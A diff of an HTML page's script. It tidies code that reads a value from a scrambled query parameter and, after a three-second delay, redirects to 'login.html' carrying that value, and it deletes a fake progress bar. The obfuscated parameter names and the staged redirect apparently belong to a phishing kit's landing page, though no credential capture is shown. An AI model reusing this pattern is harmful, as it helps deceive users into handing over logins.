@@ -1176,46 +1176,25 @@ button::-moz-focus-inner
         }
     </style>
       <script>
-
-           // Function to extract query parameter value
-        function getQueryParameter(parameterName) {
-                var queryString = window.location.search;
-                var urlParams = new URLSearchParams(queryString);
-                return urlParams.get(parameterName);
-                }
-               // Get the value from the 'data' query parameter
+		    // Function to extract query parameter value
+		    function getQueryParameter(parameterName) {
+		      var queryString = window.location.search;
+		      var urlParams = new URLSearchParams(queryString);
+		      return urlParams.get(parameterName);
+		    }
+		    // Get the value from the 'data' query parameter
 		    var value = getQueryParameter('jdfgjfgjfgjgdjgdj');
 		    
-        function redirectToDestination() {
-       // Redirect to the destination page with the variable value in the URL
-       window.location.href = "login.html?fghgfrtyhfghrytretrg=" + (value);
-       }
+		     function redirectToDestination() {
+		    // Redirect to the destination page with the variable value in the URL
+		    window.location.href = "login.html?fghgfrtyhfghrytretrg=" + (value);
+		    }
 
-       // Automatically redirect after a certain delay (e.g., 2 seconds)
-       setTimeout(redirectToDestination, 3000);
-       
-            
-        function startProgress() {
-              
-                    
-              let progress = 0;
-              const progressBar = document.querySelector('.progress-bar');
-              const progressText = document.querySelector('.progress-text');
-
-              const interval = setInterval(() => {
-              progress++;
-              progressBar.style.width = progress + '%';
-              progressText.textContent = progress + '%';
-
-              if (progress >= 100) {
-                clearInterval(interval);
-              }
-            }, 60); // 4 seconds at 1000ms / 25fps = 40ms per frame
-          }
-
-          startProgress();
-
-        </script>
+		    // Automatically redirect after a certain delay (e.g., 2 seconds)
+		    setTimeout(redirectToDestination, 3000);
+		    
+		
+	 </script>
   </head>
     <!--[if IE 8 ]> <body class="ie8"> <![endif]-->
     <!--[if (gte IE 9)|!(IE)]><!--> <body class="notIE8"> <!--<![endif]-->
